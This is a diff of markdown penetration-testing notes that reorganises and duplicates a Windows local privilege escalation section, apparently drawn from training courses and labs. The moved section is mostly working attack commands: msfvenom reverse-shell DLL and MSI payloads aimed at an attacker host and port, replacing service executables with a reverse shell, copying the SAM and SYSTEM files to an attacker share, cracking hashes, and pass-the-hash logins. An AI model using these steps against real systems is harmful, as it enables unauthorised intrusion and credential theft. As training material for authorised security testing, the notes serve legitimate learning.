@@ -4,7 +4,7 @@
 
 - [cheat sheets and resources](#cheat-sheets-and-resources)
 ------------------------------------------------------------------------------------
-## 1. tools
+## tools
 - [tools](#tools)
   - [PowerView/SharpView](#PowerViewSharpView)
   - [BloodHound](#BloodHound)
@@ -70,7 +70,7 @@
   - [winexe](#winexe)
   - [snmpwalk](#snmpwalk)
   - ------------------------------------------------------------------------------------
-## 2. Pivoting Tunneling and Port Forwarding
+## Pivoting Tunneling and Port Forwarding
 - [Pivoting Tunneling and Port Forwarding](#Pivoting-Tunneling-and-Port-Forwarding)
   - [Meterpreter Tunneling and Port Forwarding](#Meterpreter-Tunneling-and-Port-Forwarding)
   - [sshuttle](#sshuttle)
@@ -83,9 +83,9 @@
   - [SSH Pivoting with Sshuttle](#SSH-Pivoting-with-Sshuttle)
   - [Web Server Pivoting with Rpivot](#Web-Server-Pivoting-with-Rpivot)
 ------------------------------------------------------------------------------------
-Local Windows
+## Local Windows
 ------------------------------------------------------------------------------------
-## 3. Local Privilige Escalation
+## Tib3rius ⁣Privilege Escalation
 - [Local Privilige Escalation](#Local-Privilige-Escalation)
   - [General Concepts](#General-Concepts)
 - [understanding permissions in windows](#understanding-permissions-in-windows)
@@ -102,6 +102,40 @@ Local Windows
   - [Seatbelt](#Seatbelt)
   - [Winpeas](#Winpeas)
   - [accesschk](#accesschk)
+  
+- [Kernel Exploits](#Kernel-Exploits)
+- [Service Exploits](#Service-Exploits)
+  - [Services](#Services)
+  - [Service Misconfigurations](#Service-Misconfigurations)
+  - [Insecure Service Permissions](#Insecure-Service-Permissions)
+  - [Unquoted Service Path](#Unquoted-Service-Path)
+  - [Weak Registry Permissions](#Weak-Registry-Permissions)
+  - [Insecure Service Executables](#Insecure-Service-Executables)
+  - [DLL Hijacking ](#DLL-Hijacking)
+- [Registry exploits](#Registry-exploits)
+  - [AutoRuns](#AutoRuns)
+  - [AlwaysInstallElevated REG](#AlwaysInstallElevated-REG)
+- [passwords](#passwords)
+  - [Registry](#Registry)
+  - [Searching the Registry for Passwords](#Searching-the-Registry-for-Passwords)
+  - [Saved Creds](#Saved-Creds)
+  - [Configuration Files](#Configuration-Files)
+  - [Searching for Configuration Files](#Searching-for-Configuration-Files)
+  - [SAM](#SAM)
+  - [SAM/SYSTEM Locations](#SAM/SYSTEM-Locations)
+  - [Passing the Hash](#Passing-the-Hash)
+- [scheduled tasks](#scheduled-tasks)
+- [insecure GUI apps](#insecure-GUI-apps)
+- [startup apps](#startup-apps)
+- [installed apps](#installed-apps)
+- [hot potato](#hot-potato)
+- [token impersonation](#token-impersonation)
+- [port forwarding](#port-forwarding)
+- [privilege escalation strategy](#privilege-escalation-strategy)
+- [getsystem Named Pipes and Token Duplication](#getsystem-Named-Pipes-and-Token-Duplication)
+- [user privileges](#user-privileges)
+- [Privilege Escalation Strategy](#Privilege-Escalation-Strategy)
+
 ------------------------------------------------------------------------------------------------
 - [Local Windows Credentials](#Local-Windows-Credentials)
   - [Keystrokes](#Keystrokes)
@@ -164,44 +198,20 @@ Local Windows
   - [SNMP](#SNMP)
   
 ------------------------------------------------------------------------------------------------
-
+## Windows priv esc Tryhackme 1 
+```
+https://tryhackme.com/room/windowsprivesc20
+```
 - [Privilege Escalation Techniques](#Privilege-Escalation-Techniques)
 - [Harvesting Passwords from Usual Spots](#Harvesting-Passwords-from-Usual-Spots)
 - [Other Quick Wins](#Other-Quick-Wins)
 - [Abusing Service Misconfigurations](#Abusing-Service-Misconfigurations)
 - [Abusing dangerous privileges](#Abusing-dangerous-privileges)
 - [Abusing vulnerable software](#Abusing-vulnerable-software)
-- [Kernel Exploits](#Kernel-Exploits)
-- [Service Exploits](#Service-Exploits)
-  - [Services](#Services)
-  - [Service Misconfigurations](#Service-Misconfigurations)
-  - [Insecure Service Permissions](#Insecure-Service-Permissions)
-  - [Unquoted Service Path](#Unquoted-Service-Path)
-  - [Weak Registry Permissions](#Weak-Registry-Permissions)
-  - [Insecure Service Executables](#Insecure-Service-Executables)
-  - [DLL Hijacking ](#DLL-Hijacking)
-- [Registry exploits](#Registry-exploits)
-  - [AutoRuns](#AutoRuns)
-  - [AlwaysInstallElevated REG](#AlwaysInstallElevated-REG)
-- [passwords](#passwords)
-  - [Registry](#Registry)
-  - [Searching the Registry for Passwords](#Searching-the-Registry-for-Passwords)
-  - [Saved Creds](#Saved-Creds)
-  - [Configuration Files](#Configuration-Files)
-  - [Searching for Configuration Files](#Searching-for-Configuration-Files)
-  - [SAM](#SAM)
-  - [SAM/SYSTEM Locations](#SAM/SYSTEM-Locations)
-  - [Passing the Hash](#Passing-the-Hash)
-- [scheduled tasks](#scheduled-tasks)
-- [insecure GUI apps](#insecure-GUI-apps)
-- [startup apps](#startup-apps)
-- [installed apps](#installed-apps)
-- [hot potato](#hot-potato)
-- [token impersonation](#token-impersonation)
-- [port forwarding](#port-forwarding)
-- [privilege escalation strategy](#privilege-escalation-strategy)
-- [getsystem Named Pipes and Token Duplication](#getsystem-Named-Pipes-and-Token-Duplication)
-- [user privileges](#user-privileges)
+
+------------------------------------------------------------------------------------------------
+
+
 ------------------------------------------------------------------------------------
 Active Directory 
 ------------------------------------------------------------------------------------
@@ -1982,7 +1992,663 @@ The downside is more recent versions of the program spawn a GUI
 to use an older version which still has an /accepteula command line
 option.
 
-----------------------------------------------------------------------------------------------------------------------------------
+
+### Kernel Exploits
+#### What is a Kernel?
+Kernels are the core of any operating system.
+Think of it as a layer between application software and the
+actual computer hardware.
+
+The kernel has complete control over the operating system.
+Exploiting a kernel vulnerability can result in execution as the
+SYSTEM user.
+
+#### Finding Kernel Exploits
+
+Finding and using kernel exploits is usually a simple process:
+
+1. Enumerate Windows version / patch level (systeminfo).
+2. Find matching exploits (Google, ExploitDB, GitHub).
+3. Compile and run.
+
+Beware though, as Kernel exploits can often be unstable and
+may be one-shot or cause a system crash.
+
+
+Tools
+Windows Exploit Suggester:
+```
+https://github.com/bitsadmin/wesng
+```
+
+Precompiled Kernel Exploits:
+```
+https://github.com/SecWiki/windows-kernel-exploits
+```
+Watson:
+```
+https://github.com/rasta-mouse/Watson
+```
+
+### Privilege Escalation
+
+(Note: These steps are for Windows 7)
+1.Extract the output of the systeminfo command:
+```
+> systeminfo > systeminfo.txt
+```
+2.Run wesng to find potential exploits:
+```
+# python wes.py systeminfo.txt -i 'Elevation
+of Privilege' --exploits-only | less
+```
+3.Cross-reference results with compiled exploits:
+https://github.com/SecWiki/windows-kernel-exploits
+
+4.Download the compiled exploit for <whatever CVE or exploit it found> but for this demo we use the CVE-2018-8210 and put it onto the Windows VM:
+```
+https://github.com/SecWiki/windows-
+kernel-exploits/blob/master/CVE-2018-8120/x64.exe
+```
+
+5.Start a listener on Kali and run the exploit, providing it
+with the reverse shell executable, which should run with
+SYSTEM privileges:
+```
+> .\x64.exe C:\PrivEsc\reverse.exe
+```
+
+### Service Exploits
+### Services
+
+Services are simply programs that run in the
+background, accepting input or performing regular
+tasks.
+
+If services run with SYSTEM privileges and are
+misconfigured, exploiting them may lead to command
+execution with SYSTEM privileges as well.
+
+the following commands are usefull when dealing with services.
+
+Service Commands
+Query the configuration of a service:
+```
+> sc.exe qc <name>
+```
+Query the current status of a service:
+```
+> sc.exe query <name>
+```
+Modify a configuration option of a service:
+```
+> sc.exe config <name> <option>= <value>
+```
+Start/Stop a service:
+```
+> net start/stop <name>
+```
+
+
+#### Service Misconfigurations
+  
+1. Insecure Service Properties
+2. Unquoted Service Path
+3. Weak Registry Permissions
+4. Insecure Service Executables
+5. DLL Hijacking
+
+
+### Insecure Service Permissions
+
+Each service has an ACL which defines certain service-specific
+permissions.
+
+Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG,
+SERVICE_QUERY_STATUS).
+
+Some may be useful (e.g. SERVICE_STOP, SERVICE_START).
+
+Some are dangerous (e.g. SERVICE_CHANGE_CONFIG,
+SERVICE_ALL_ACCESS)
+
+
+If our user has permission to change the configuration of a
+service which runs with SYSTEM privileges, we can change
+the executable the service uses to one of our own.
+
+Potential Rabbit Hole: If you can change a service
+configuration but cannot stop/start the service, you may not
+be able to escalate privileges!
+
+Privilege Escalation
+example:
+1.Run winPEAS to check for service misconfigurations:
+```
+> .\winPEASany.exe quiet servicesinfo
+```
+2.Note that we can modify the “daclsvc” service.
+
+3.We can confirm this with accesschk.exe:
+```
+> .\accesschk.exe /accepteula -uwcqv user daclsvc
+```
+4.Check the current configuration of the service:
+```
+> sc qc daclsvc
+```
+
+5.Check the current status of the service:
+```
+> sc query daclsvc
+```
+6.Reconfigure the service to use our reverse shell executable:
+```
+> sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+```
+7.Start a listener on Kali, and then start the service to trigger the
+exploit:
+```
+> net start daclsvc
+```
+
+#### Unquoted Service Path
+Executables in Windows can be run without using their
+extension (e.g. “whoami.exe” can be run by just typing
+“whoami”).
+
+Some executables take arguments, separated by spaces, e.g.
+someprog.exe arg1 arg2 arg3...
+
+This behavior leads to ambiguity when using absolute paths
+that are unquoted and contain spaces.
+
+
+Consider the following unquoted path:
+C:\Program Files\Some Dir\SomeProgram.exe
+
+To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be
+the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe”
+
+Windows resolves this ambiguity by checking each of the possibilities in turn.
+
+If we can write to a location Windows checks before the actual executable, we
+can trick the service into executing it instead.
+
+
+#### Privilege Escalation
+
+1.Run winPEAS to check for service misconfigurations:
+```
+> .\winPEASany.exe quiet servicesinfo
+```
+2.Note that the “unquotedsvc” service has an unquoted path that
+also contains spaces:
+```
+C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+```
+3.Confirm this using sc:
+```
+> sc qc unquotedsvc
+```
+
+
+4.Use accesschk.exe to check for write permissions:
+```
+> .\accesschk.exe /accepteula -uwdq C:\
+```
+```
+> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+```
+```
+> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+```
+5.Copy the reverse shell executable and rename it appropriately:
+```
+> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+```
+6.Start a listener on Kali, and then start the service to trigger the exploit:
+```
+> net start unquotedsvc
+```
+
+#### Weak Registry Permissions
+
+The Windows registry stores entries for each service.
+Since registry entries can have ACLs, if the ACL is
+misconfigured, it may be possible to modify a service’s
+configuration even if we cannot modify the service
+directly.
+
+Privilege Escalation
+
+1.Run winPEAS to check for service misconfigurations:
+```
+> .\winPEASany.exe quiet servicesinfo
+```
+2.Note that the “regsvc” service has a weak registry entry. We can confirm this with
+PowerShell:
+```
+PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+```
+
+3.Alternatively accesschk.exe can be used to confirm:
+```
+> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+```
+
+#### Insecure Service Executables
+
+If the original service executable is modifiable by our
+user, we can simply replace it with our reverse shell
+executable.
+
+Remember to create a backup of the original executable
+if you are exploiting this in a real system!
+
+#### Privilege Escalation
+
+1.Run winPEAS to check for service misconfigurations:
+```
+> .\winPEASany.exe quiet servicesinfo
+```
+2.Note that the “filepermsvc” service has an executable which appears to be
+
+writable by everyone. We can confirm this with accesschk.exe:
+```
+> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+```
+3.Create a backup of the original service executable:
+```
+> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
+```
+4.Copy the reverse shell executable to overwrite the service
+executable:
+```
+> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+```
+5.Start a listener on Kali, and then start the service to trigger the
+exploit:
+```
+> net start filepermsvc
+```
+
+### DLL Hijacking 
+  
+Often a service will try to load functionality from a library
+called a DLL (dynamic-link library). Whatever functionality the
+DLL provides, will be executed with the same privileges as the
+service that loaded it.
+
+If a DLL is loaded with an absolute path, it might be possible
+to escalate privileges if that DLL is writable by our user.
+
+
+A more common misconfiguration that can be used to
+escalate privileges is if a DLL is missing from the system,
+and our user has write access to a directory within the
+PATH that Windows searches for DLLs in.
+
+Unfortunately, initial detection of vulnerable services is
+difficult, and often the entire process is very manual.
+
+#### Privilege Escalation
+
+1.Use winPEAS to enumerate non-Windows services:
+```
+> .\winPEASany.exe quiet servicesinfo
+```
+2.Note that the C:\Temp directory is writable and in the PATH. Start by
+enumerating which of these services our user has stop and start access to:
+```
+> .\accesschk.exe /accepteula -uvqc user dllsvc
+```
+3.The “dllsvc” service is vulnerable to DLL Hijacking. According to the
+winPEAS output, the service runs the dllhijackservice.exe executable. We
+can confirm this manually:
+```
+> sc qc dllsvc
+```
+4.Run Procmon64.exe with administrator privileges. Press
+Ctrl+L to open the Filter menu.
+
+5.Add a new filter on the Process Name matching
+dllhijackservice.exe.
+
+6.On the main screen, deselect registry activity and
+network activity.
+
+7.Start the service:
+```
+> net start dllsvc
+```
+8.Back in Procmon, note that a number of “NAME NOT
+FOUND” errors appear, associated with the hijackme.dll file.
+
+9.At some point, Windows tries to find the file in the C:\Temp
+directory, which as we found earlier, is writable by our user.
+
+10. On Kali, generate a reverse shell DLL named hijackme.dll:
+```
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
+```
+11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a
+listener on Kali and then stop/start the service to trigger the exploit:
+```
+> net stop dllsvc
+```
+```
+> net start dllsvc
+```
+
+
+### Registry exploits
+
+#### AutoRuns
+Windows can be configured to run commands at startup,
+with elevated privileges.
+
+These “AutoRuns” are configured in the Registry.
+If you are able to write to an AutoRun executable, and are
+able to restart the system (or wait for it to be restarted) you
+may be able to escalate privileges.
+
+  
+#### Privilege Escalation
+
+1. Use winPEAS to check for writable AutoRun executables:
+```
+> .\winPEASany.exe quiet applicationsinfo
+```
+2. Alternatively, we could manually enumerate the AutoRun executables:
+```
+> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+```
+and then use accesschk.exe to verify the permissions on each one:
+```
+> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+```
+
+3. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by
+Everyone. Create a backup of the original:
+```
+> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
+```
+4. Copy our reverse shell executable to overwrite the AutoRun executable:
+```
+> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
+```
+5. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on
+Windows 10, the exploit appears to run with the privileges of the last logged on user, so log
+out of the “user” account and log in as the “admin” account first.
+
+#### AlwaysInstallElevated REG 
+MSI files are package files used to install applications.
+These files run with the permissions of the user trying to install
+them.
+
+Windows allows for these installers to be run with elevated (i.e.
+admin) privileges.
+
+If this is the case, we can generate a malicious MSI file which
+contains a reverse shell.
+
+The catch is that two Registry settings must be enabled for this to work.
+The “AlwaysInstallElevated” value must be set to 1 for both the local
+machine:
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+and the current user:
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+If either of these are missing or disabled, the exploit will not work.
+
+#### 1.Use winPEAS to see if both registry values are set:
+```
+> .\winPEASany.exe quiet windowscreds
+```
+2.Alternatively, verify the values manually:
+```
+> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+```
+> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+3.Create a new reverse shell with msfvenom, this time using the msi format,
+and save it with the .msi extension:
+```
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
+```
+4.Copy the reverse.msi across to the Windows VM, start a listener on Kali,
+and run the installer to trigger the exploit:
+```
+> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+```
+
+### passwords
+#### Passwords?
+
+Yes, passwords.
+
+Even administrators re-use their passwords, or leave
+their passwords on systems in readable locations.
+Windows can be especially vulnerable to this, as several
+features of Windows store passwords insecurely.
+
+#### Registry
+Plenty of programs store configuration options in the
+Windows Registry.
+
+Windows itself sometimes will store passwords in
+plaintext in the Registry.
+
+It is always worth searching the Registry for passwords.
+
+#### Searching the Registry for Passwords
+The following commands will search the registry for keys and
+values that contain “password”
+```
+> reg query HKLM /f password /t REG_SZ /s
+```
+```
+> reg query HKCU /f password /t REG_SZ /s
+```
+This usually generates a lot of results, so often it is more
+fruitful to look in known locations.
+
+#### Privilege Escalation
+
+1.Use winPEAS to check common password locations:
+```
+> .\winPEASany.exe quiet filesinfo userinfo
+```
+(the final checks will take a long time to complete)
+2.The results show both AutoLogon credentials and Putty
+session credentials for the admin user
+(admin/password123).
+
+3.We can verify these manually:
+```
+> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+```
+```
+> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+```
+4.On Kali, we can use the winexe command to spawn a shell using these
+credentials:
+```
+# winexe -U 'admin%password123' //192.168.1.22 cmd.exe
+```
+if your a admin (or have admin creds etc) you can modify the command a bit and add 
+```
+--system
+```
+so for an example: 
+```
+# winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe
+```
+to spawn a system shell
+
+
+#### Saved Creds
+Windows has a runas command which allows users to run
+commands with the privileges of other users.
+This usually requires the knowledge of the other user’s
+password.
+
+However, Windows also allows users to save their credentials
+to the system, and these saved credentials can be used to
+bypass this requirement.
+
+#### Privilege Escalation
+1.Use winPEAS to check for saved credentials:
+```
+> .\winPEASany.exe quiet cmd windowscreds
+```
+2.It appears that saved credentials for the admin user exist.
+
+3.We can verify this manually using the following command:
+```
+> cmdkey /list
+```
+
+4.If the saved credentials aren’t present, run the following script to
+refresh the credential: (ops just in this lab/demo)
+```
+> C:\PrivEsc\savecred.bat
+```
+5.We can use the saved credential to run any command as the admin
+user. Start a listener on Kali and run the reverse shell executable:
+```
+> runas /savecred /user:admin C:\PrivEsc\reverse.exe
+```
+
+### Configuration Files
+Some administrators will leave configurations files on
+the system with passwords in them.
+
+The Unattend.xml file is an example of this.
+It allows for the largely automated setup of Windows
+systems.
+
+#### Searching for Configuration Files
+Recursively search for files in the current directory with
+“pass” in the name, or ending in “.config”:
+```
+> dir /s *pass* == *.config
+```
+Recursively search for files in the current directory that
+contain the word “password” and also end in either .xml, .ini,
+or .txt:
+```
+> findstr /si password *.xml *.ini *.txt
+```
+
+#### Privilege Escalation
+1. Use winPEAS to search for common files which may
+contain credentials:
+```
+> .\winPEASany.exe quiet cmd searchfast filesinfo
+```
+2. The Unattend.xml file was found. View the contents:
+```
+> type C:\Windows\Panther\Unattend.xml
+``` 
+3.A password for the admin user was found. The password
+is Base64 encoded: cGFzc3dvcmQxMjM=
+
+4.On Kali we can easily decode this:
+```
+# echo "cGFzc3dvcmQxMjM=" | base64 -d
+```
+5.Once again we can simply use winexe to spawn a shell as
+the admin user.
+
+### SAM
+Windows stores password hashes in the Security Account
+Manager (SAM).
+
+The hashes are encrypted with a key which can be found in a
+file named SYSTEM.
+
+If you have the ability to read the SAM and SYSTEM files, you
+can extract the hashes.
+
+#### SAM/SYSTEM Locations
+The SAM and SYSTEM files are located in the
+C:\Windows\System32\config directory.
+
+The files are locked while Windows is running.
+
+Backups of the files may exist in the C:\Windows\Repair
+or C:\Windows\System32\config\RegBack directories.
+
+#### Privilege Escalation
+1.Backups of the SAM and SYSTEM files can be found in
+C:\Windows\Repair and are readable by our user.
+
+2.Copy the files back to Kali:
+```
+> copy C:\Windows\Repair\SAM \\192.168.1.11\tools\
+```
+```
+> copy C:\Windows\Repair\SYSTEM \\192.168.1.11\tools\
+```
+
+3.Download the latest version of the creddump suite:
+```
+# git clone https://github.com/Neohapsis/creddump7.git
+```
+4.Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
+```
+# python2 creddump7/pwdump.py SYSTEM SAM
+```
+5.Crack the admin user hash using hashcat:
+```
+# hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
+```
+
+### Passing the Hash
+Windows accepts hashes instead of passwords to
+authenticate to a number of services.
+
+We can use a modified version of winexe, pth-winexe to
+spawn a command prompt using the admin user’s hash.
+
+#### Privilege Escalation
+1.Extract the admin hash from the SAM in the previous step.
+2.Use the hash with pth-winexe to spawn a command prompt:
+```
+# pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+```
+3.Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
+```
+# pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+```
+
+### scheduled tasks
+
+### insecure GUI apps
+
+### startup apps
+
+### installed apps
+
+### hot potato
+
+### token impersonation
+
+### port forwarding
+
+### privilege escalation strategy
+
+### getsystem Named Pipes and Token Duplication
+
+### user privileges
+
+### Privilege Escalation Strategy
+
+  
+-------------------------------------------------------------------------------------------------------------------
 ### Local Windows Credentials 
 In general, Windows operating system provides two types of user accounts: Local and Domain. Local users' details are stored locally within the Windows file system, while domain users' details are stored in the centralized Active Directory. This task discusses credentials for local user accounts and demonstrates how they can be obtained.
 
@@ -3786,658 +4452,8 @@ net user pwnd
 As a last step, you can run a command prompt as administrator:
 
 ![image](https://user-images.githubusercontent.com/24814781/181487825-be4765a4-8799-48b0-9545-9340b112579d.png)
+---------------------------------------------------------------------------------------------------------
 
-### Kernel Exploits
-#### What is a Kernel?
-Kernels are the core of any operating system.
-Think of it as a layer between application software and the
-actual computer hardware.
-
-The kernel has complete control over the operating system.
-Exploiting a kernel vulnerability can result in execution as the
-SYSTEM user.
-
-#### Finding Kernel Exploits
-
-Finding and using kernel exploits is usually a simple process:
-
-1. Enumerate Windows version / patch level (systeminfo).
-2. Find matching exploits (Google, ExploitDB, GitHub).
-3. Compile and run.
-
-Beware though, as Kernel exploits can often be unstable and
-may be one-shot or cause a system crash.
-
-
-Tools
-Windows Exploit Suggester:
-```
-https://github.com/bitsadmin/wesng
-```
-
-Precompiled Kernel Exploits:
-```
-https://github.com/SecWiki/windows-kernel-exploits
-```
-Watson:
-```
-https://github.com/rasta-mouse/Watson
-```
-
-### Privilege Escalation
-
-(Note: These steps are for Windows 7)
-1.Extract the output of the systeminfo command:
-```
-> systeminfo > systeminfo.txt
-```
-2.Run wesng to find potential exploits:
-```
-# python wes.py systeminfo.txt -i 'Elevation
-of Privilege' --exploits-only | less
-```
-3.Cross-reference results with compiled exploits:
-https://github.com/SecWiki/windows-kernel-exploits
-
-4.Download the compiled exploit for <whatever CVE or exploit it found> but for this demo we use the CVE-2018-8210 and put it onto the Windows VM:
-```
-https://github.com/SecWiki/windows-
-kernel-exploits/blob/master/CVE-2018-8120/x64.exe
-```
-
-5.Start a listener on Kali and run the exploit, providing it
-with the reverse shell executable, which should run with
-SYSTEM privileges:
-```
-> .\x64.exe C:\PrivEsc\reverse.exe
-```
-
-### Service Exploits
-### Services
-
-Services are simply programs that run in the
-background, accepting input or performing regular
-tasks.
-
-If services run with SYSTEM privileges and are
-misconfigured, exploiting them may lead to command
-execution with SYSTEM privileges as well.
-
-the following commands are usefull when dealing with services.
-
-Service Commands
-Query the configuration of a service:
-```
-> sc.exe qc <name>
-```
-Query the current status of a service:
-```
-> sc.exe query <name>
-```
-Modify a configuration option of a service:
-```
-> sc.exe config <name> <option>= <value>
-```
-Start/Stop a service:
-```
-> net start/stop <name>
-```
-
-
-#### Service Misconfigurations
-  
-1. Insecure Service Properties
-2. Unquoted Service Path
-3. Weak Registry Permissions
-4. Insecure Service Executables
-5. DLL Hijacking
-
-
-### Insecure Service Permissions
-
-Each service has an ACL which defines certain service-specific
-permissions.
-
-Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG,
-SERVICE_QUERY_STATUS).
-
-Some may be useful (e.g. SERVICE_STOP, SERVICE_START).
-
-Some are dangerous (e.g. SERVICE_CHANGE_CONFIG,
-SERVICE_ALL_ACCESS)
-
-
-If our user has permission to change the configuration of a
-service which runs with SYSTEM privileges, we can change
-the executable the service uses to one of our own.
-
-Potential Rabbit Hole: If you can change a service
-configuration but cannot stop/start the service, you may not
-be able to escalate privileges!
-
-Privilege Escalation
-example:
-1.Run winPEAS to check for service misconfigurations:
-```
-> .\winPEASany.exe quiet servicesinfo
-```
-2.Note that we can modify the “daclsvc” service.
-
-3.We can confirm this with accesschk.exe:
-```
-> .\accesschk.exe /accepteula -uwcqv user daclsvc
-```
-4.Check the current configuration of the service:
-```
-> sc qc daclsvc
-```
-
-5.Check the current status of the service:
-```
-> sc query daclsvc
-```
-6.Reconfigure the service to use our reverse shell executable:
-```
-> sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
-```
-7.Start a listener on Kali, and then start the service to trigger the
-exploit:
-```
-> net start daclsvc
-```
-
-#### Unquoted Service Path
-Executables in Windows can be run without using their
-extension (e.g. “whoami.exe” can be run by just typing
-“whoami”).
-
-Some executables take arguments, separated by spaces, e.g.
-someprog.exe arg1 arg2 arg3...
-
-This behavior leads to ambiguity when using absolute paths
-that are unquoted and contain spaces.
-
-
-Consider the following unquoted path:
-C:\Program Files\Some Dir\SomeProgram.exe
-
-To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be
-the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe”
-
-Windows resolves this ambiguity by checking each of the possibilities in turn.
-
-If we can write to a location Windows checks before the actual executable, we
-can trick the service into executing it instead.
-
-
-#### Privilege Escalation
-
-1.Run winPEAS to check for service misconfigurations:
-```
-> .\winPEASany.exe quiet servicesinfo
-```
-2.Note that the “unquotedsvc” service has an unquoted path that
-also contains spaces:
-```
-C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
-```
-3.Confirm this using sc:
-```
-> sc qc unquotedsvc
-```
-
-
-4.Use accesschk.exe to check for write permissions:
-```
-> .\accesschk.exe /accepteula -uwdq C:\
-```
-```
-> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
-```
-```
-> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
-```
-5.Copy the reverse shell executable and rename it appropriately:
-```
-> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
-```
-6.Start a listener on Kali, and then start the service to trigger the exploit:
-```
-> net start unquotedsvc
-```
-
-#### Weak Registry Permissions
-
-The Windows registry stores entries for each service.
-Since registry entries can have ACLs, if the ACL is
-misconfigured, it may be possible to modify a service’s
-configuration even if we cannot modify the service
-directly.
-
-Privilege Escalation
-
-1.Run winPEAS to check for service misconfigurations:
-```
-> .\winPEASany.exe quiet servicesinfo
-```
-2.Note that the “regsvc” service has a weak registry entry. We can confirm this with
-PowerShell:
-```
-PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
-```
-
-3.Alternatively accesschk.exe can be used to confirm:
-```
-> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
-```
-
-#### Insecure Service Executables
-
-If the original service executable is modifiable by our
-user, we can simply replace it with our reverse shell
-executable.
-
-Remember to create a backup of the original executable
-if you are exploiting this in a real system!
-
-#### Privilege Escalation
-
-1.Run winPEAS to check for service misconfigurations:
-```
-> .\winPEASany.exe quiet servicesinfo
-```
-2.Note that the “filepermsvc” service has an executable which appears to be
-
-writable by everyone. We can confirm this with accesschk.exe:
-```
-> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
-```
-3.Create a backup of the original service executable:
-```
-> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
-```
-4.Copy the reverse shell executable to overwrite the service
-executable:
-```
-> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
-```
-5.Start a listener on Kali, and then start the service to trigger the
-exploit:
-```
-> net start filepermsvc
-```
-
-### DLL Hijacking 
-  
-Often a service will try to load functionality from a library
-called a DLL (dynamic-link library). Whatever functionality the
-DLL provides, will be executed with the same privileges as the
-service that loaded it.
-
-If a DLL is loaded with an absolute path, it might be possible
-to escalate privileges if that DLL is writable by our user.
-
-
-A more common misconfiguration that can be used to
-escalate privileges is if a DLL is missing from the system,
-and our user has write access to a directory within the
-PATH that Windows searches for DLLs in.
-
-Unfortunately, initial detection of vulnerable services is
-difficult, and often the entire process is very manual.
-
-#### Privilege Escalation
-
-1.Use winPEAS to enumerate non-Windows services:
-```
-> .\winPEASany.exe quiet servicesinfo
-```
-2.Note that the C:\Temp directory is writable and in the PATH. Start by
-enumerating which of these services our user has stop and start access to:
-```
-> .\accesschk.exe /accepteula -uvqc user dllsvc
-```
-3.The “dllsvc” service is vulnerable to DLL Hijacking. According to the
-winPEAS output, the service runs the dllhijackservice.exe executable. We
-can confirm this manually:
-```
-> sc qc dllsvc
-```
-4.Run Procmon64.exe with administrator privileges. Press
-Ctrl+L to open the Filter menu.
-
-5.Add a new filter on the Process Name matching
-dllhijackservice.exe.
-
-6.On the main screen, deselect registry activity and
-network activity.
-
-7.Start the service:
-```
-> net start dllsvc
-```
-8.Back in Procmon, note that a number of “NAME NOT
-FOUND” errors appear, associated with the hijackme.dll file.
-
-9.At some point, Windows tries to find the file in the C:\Temp
-directory, which as we found earlier, is writable by our user.
-
-10. On Kali, generate a reverse shell DLL named hijackme.dll:
-```
